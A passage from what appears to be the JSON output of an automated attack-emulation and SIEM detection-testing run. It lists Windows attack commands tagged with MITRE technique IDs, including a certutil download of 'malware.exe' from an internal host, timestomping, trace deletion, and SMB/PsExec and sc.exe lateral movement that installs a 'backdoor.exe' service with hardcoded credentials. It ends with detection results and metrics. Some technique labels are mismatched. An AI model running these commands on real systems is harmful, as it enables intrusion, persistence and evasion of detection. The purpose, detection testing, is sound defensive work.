      "command": "powershell -Command \"try { $services = Get-Service | Where-Object { $_.Status -eq 'Running' -and $_.StartType -eq 'Automatic' }; $services | Select-Object Name, DisplayName | ConvertTo-Json } catch { 'Error accessing services' }\"",
      "description": "Discovers running automatic services via PowerShell, simulating reconnaissance for potential lateral movement targets.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Outputs JSON-formatted list of running services with automatic startup. Minimal system impact.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:39.828071",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e53c1754-9352-4ea8-b38a-6b4632b05026",
      "ttp_id": "unknown",
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& { $api = 'http://127.0.0.1:80/api/services'; try { $result = Invoke-WebRequest -Uri $api -Method GET -TimeoutSec 5; $result.Content } catch { 'Service API unreachable' } }\"",
      "description": "Attempts to discover network services by querying a local HTTP endpoint, simulating post-compromise service enumeration.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends GET request to localhost API endpoint; fails silently if no service is listening. No data exfiltration or modification occurs.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:39.829054",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6cf68a67-cc4f-490f-af98-264e3fc60abe",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -encode \"%TEMP%\\data.txt\" \"%TEMP%\\data.b64\" && certutil.exe -decode \"%TEMP%\\data.b64\" \"%TEMP%\\data_archive.zip\"",
      "description": "Encode and decode a collected data file using certutil, simulating archiving and preparation for exfiltration",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a Base64-encoded version of data.txt, then decodes it into a .zip archive. Uses only built-in Windows tools (certutil). No network activity occurs.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:40.724928",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e8e63390-7683-4460-819e-299d19b0bada",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\\\sensitive_data\\*' -DestinationPath '%TEMP%\\\\archive.zip' -CompressionLevel Optimal -Force\"",
      "description": "Compresses collected data directory into a ZIP archive using PowerShell Compress-Archive",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates 'archive.zip' in %TEMP% containing all files from the 'sensitive_data' subdirectory. Uses built-in PowerShell cmdlet with proper escaping and Force parameter for overwrite.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:40.724928",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9dff0886-aa33-4cea-86f2-cf36b90522cb",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd -ArgumentList '/c', 'makecab', '%TEMP%\\\\payload.bin', '%TEMP%\\\\archived.cab' -WindowStyle Hidden\"",
      "description": "Uses built-in makecab.exe to create a compressed cabinet archive of collected data",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes makecab.exe via PowerShell to silently archive payload.bin into archived.cab. Utilizes legacy Windows binary for stealth and compatibility.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:40.724928",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f6eeba55-12b1-4a9a-a7aa-6e5116d04f0c",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Indicator Removal",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/malware.exe %TEMP%\\\\update.exe",
      "description": "Download a file using certutil, a built-in Windows binary often abused for file retrieval.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a remote server to the temp directory. Uses common Windows binary to evade detection.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:42.082266",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "94012689-ff54-494c-9a54-5f2d6246d4c2",
      "ttp_id": "unknown",
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Copy-Item '%TEMP%\\\\update.exe' '%TEMP%\\\\winlogon.exe'; $ft = Get-ItemProperty -Path '%TEMP%\\\\winlogon.exe' | ForEach-Object { $_.LastWriteTime }; Set-ItemProperty -Path '%TEMP%\\\\winlogon.exe' -Name LastWriteTime -Value $ft.AddHours(-2) -Force\"",
      "description": "Copy downloaded file and modify its timestamp to appear older (timestomping).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Copies a file and alters its last write time to an earlier time, simulating timestomping to evade time-based detection rules.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:42.082266",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6ddab198-7e79-447f-aee2-b134bc894735",
      "ttp_id": "unknown",
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\\\update.exe' -DestinationPath '%TEMP%\\\\archive.zip' -Force; Remove-Item '%TEMP%\\\\update.exe' -Force -ErrorAction SilentlyContinue\"",
      "description": "Archive the original file and remove it to clean traces, using built-in compression.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Archives the malicious file into a ZIP and deletes the original, reducing forensic footprint. Uses Force and error suppression for robust execution.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:42.082266",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ee98b945-b248-40d1-8156-19499e265bb2",
      "ttp_id": "unknown",
      "technique_id": "T1021.002",
      "technique_name": "Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "net use \\\\192.168.1.100\\C$ /user:admin P@ssw0rd && copy %TEMP%\\backdoor.exe \\\\192.168.1.100\\C$\\Windows\\Temp\\ && psexec \\\\192.168.1.100 -s -d \\\\192.168.1.100\\C$\\Windows\\Temp\\backdoor.exe",
      "description": "Establishes connection to remote Windows host using net.exe, copies executable via SMB share, and executes remotely using PsExec",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates authenticated SMB session, copies file to remote system, and spawns process via PsExec. Requires PsExec binary in local path.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:42.983709",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8a94c6c3-3278-40c5-9f6b-6cf1d8f67cc2",
      "ttp_id": "unknown",
      "technique_id": "T1569.002",
      "technique_name": "Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc \\\\192.168.1.100 create BackdoorService binPath= \"C:\\Windows\\Temp\\backdoor.exe\" start= auto && sc \\\\192.168.1.100 start BackdoorService",
      "description": "Creates and starts a Windows service on a remote machine using sc.exe to execute a payload",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Service is created in stopped state, then started. Executes binary with SYSTEM privileges if service account is LocalSystem. Leaves persistent artifact.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:42.983709",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f11c5dd5-66b4-4677-94a3-52c424e52801",
      "ttp_id": "unknown",
      "technique_id": "T1021.006",
      "technique_name": "Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-Command -ComputerName 192.168.1.100 -ScriptBlock { whoami; Get-Process } -Authentication Negotiate\"",
      "description": "Executes commands on a remote Windows host using PowerShell remoting (WinRM)",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Runs specified commands on remote system via WinRM. Requires PowerShell remoting enabled and appropriate user permissions. Returns output locally.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:42.983709",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "311f9678-d4a8-4a72-8964-6752a1dc7070",
      "attack_id": "a1017185-d7bf-4097-ad66-33004d6134d7",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 491.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "da18c1a8-1c44-4709-891e-6c8b0e7c4b70",
      "attack_id": "37bb12c1-f787-4237-b21c-30edc3310cf2",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 503.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "688b2663-701f-4b20-a6da-08cb781dcf8e",
      "attack_id": "f7507332-7cae-4e9d-b896-f85a7768e7d8",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 466.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "b965a7c9-cf83-4a0a-ac70-9157123b9d43",
      "attack_id": "5db244a0-afba-4daa-aafb-79888b3a2874",
      "detected": true,
      "events_found": 24,
      "historical_events": 0,
      "query_time_ms": 631.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "ff9088b9-175d-4f7e-a549-fc9f93d0d214",
      "attack_id": "c0108f4f-0cef-412d-8481-cc5b13b1e331",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 499.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "fa16c117-c3b8-49fc-9c19-a2f3decb052a",
      "attack_id": "7db9b69a-da68-49a0-a333-6ed4b1de6cf4",
      "detected": true,
      "events_found": 24,
      "historical_events": 0,
      "query_time_ms": 528.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "c4d8383d-72ae-487d-b618-dabb05976324",
      "attack_id": "dc5f76d3-88fb-4e9f-99ad-7fefb306f64e",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 477.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "c2e9f729-84b8-4bfb-8db4-7dc19e06cfac",
      "attack_id": "79607fce-dd6a-4dce-815a-a2f34330d799",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 480.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "3752b7e7-e6d2-4aaa-8dda-8a4c4a4be6c8",
      "attack_id": "64d24308-4acf-44a3-8336-4bc0a1f9ea94",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 492.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "d9acf33b-93dd-4cfa-acfb-a7fc1898b997",
      "attack_id": "86d81c6c-5904-495d-a931-1f9a5b1445b9",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 480.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "0446d526-f451-4f57-a0dd-940852428bec",
      "attack_id": "b110f95a-22ac-446c-825e-1332b1087f76",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 450.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "c5442cec-9d6f-447e-9e34-f8f3f75fb170",
      "attack_id": "c35a912d-7d70-4c19-9ff4-77e9bd461f4c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 483.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "c6d7771d-6962-4716-aaac-c4eb58f4c26e",
      "attack_id": "16de139f-a730-4e47-90a9-266ccfcbc55c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 607.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "3c72acb8-ad8b-40fb-acc7-759f7d230928",
      "attack_id": "344360a7-d9e8-479d-9ccb-4cf91eaf82cf",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 628.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "7b35e27f-6278-4f97-8236-cb6652038b37",
      "attack_id": "b991630f-e459-49a5-aac9-5fd084f2a294",
      "detected": true,
      "events_found": 42,
      "historical_events": 0,
      "query_time_ms": 460.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "9dbf825c-a621-4508-a63e-46fff31a71db",
      "attack_id": "cf32e44c-edbf-4b4d-ba0d-0d1d8d33fa33",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 494.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "20663336-a275-42ee-9d55-4591acb3d294",
      "attack_id": "50a71dd4-bedc-4738-b3c2-6373844301a5",
      "detected": true,
      "events_found": 22,
      "historical_events": 0,
      "query_time_ms": 448.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "49a3d031-813e-46fa-9289-9206f0223ad4",
      "attack_id": "4016364f-1901-4046-8c2e-9dbaec5e9b31",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 491.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "623fffc1-cb17-4835-8700-1f149fa5ccda",
      "attack_id": "efcca2a2-978b-40cf-84db-b40006c26fdc",
      "detected": true,
      "events_found": 4,
      "historical_events": 0,
      "query_time_ms": 585.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "df8a4fd3-b9a9-4ed6-83b4-991d20db7d88",
      "attack_id": "4cba2ba3-2fa8-4123-ab50-eedad70d2e0c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 443.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "749af810-e9ee-4260-b280-3e46c1deb798",
      "attack_id": "baac389f-e906-4f1a-a8c1-9cb7730ac449",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 670.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "b1b6c617-82dc-4365-be1c-5d16ee76fb1a",
      "attack_id": "3cefd1c5-e02f-4470-8c0a-30af6eda2c48",
      "detected": true,
      "events_found": 32,
      "historical_events": 0,
      "query_time_ms": 642.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "ee9e67e9-5011-447e-b5b1-fed29853785e",
      "attack_id": "c98d2d0d-6851-4a25-815e-5dab75000253",
      "detected": true,
      "events_found": 4,
      "historical_events": 0,
      "query_time_ms": 636.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "6f3caf92-b1ce-482a-93e7-f61a87db01f1",
      "attack_id": "5524e0aa-cb46-4000-afa7-672dfa7acecc",
      "detected": true,
      "events_found": 22,
      "historical_events": 0,
      "query_time_ms": 572.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "0a901713-9601-4eeb-8ff7-11262bb128d2",
      "attack_id": "2f5e5648-919b-43ad-95d7-e60af10eef95",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 542.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "dd62fc6e-fa4e-45bd-bb62-9cc55d1aec54",
      "attack_id": "80f146ea-4df0-4e19-a647-6981c65ceb61",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 486.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "8b113719-9de4-4b92-a024-7e1b2073d402",
      "attack_id": "f157cbdf-dd74-428e-a90f-218a42aacefd",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 708.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "30edc82c-50d8-483f-92b4-d4f00c1635db",
      "attack_id": "412626bb-7d34-4aab-ba23-9dd428d45c6c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 471.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "8abc22ee-c6da-41a7-a59c-11152bce49c4",
      "attack_id": "29b8585d-6e96-40ab-bb61-227a21bef555",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 566.0000000000001,
      "status": "success",
      "message": "Verification complete"
    }
  ],
  "siem_metrics": {
    "true_positives": 10,
    "false_positives": 0,
    "false_negatives": 19,
    "true_negatives": 0,
    "precision": 1.0,
    "recall": 0.3448275862068966,
    "f1_score": 0.5128205128205129,
    "accuracy": 0.3448275862068966,
    "detection_rate": 0.3448275862068966,
    "false_positive_rate": 0.0
  },
  "iterations": 3,
  "final_score": 0.542,
  "timestamp": "2025-12-22T23:00:49.101739"
}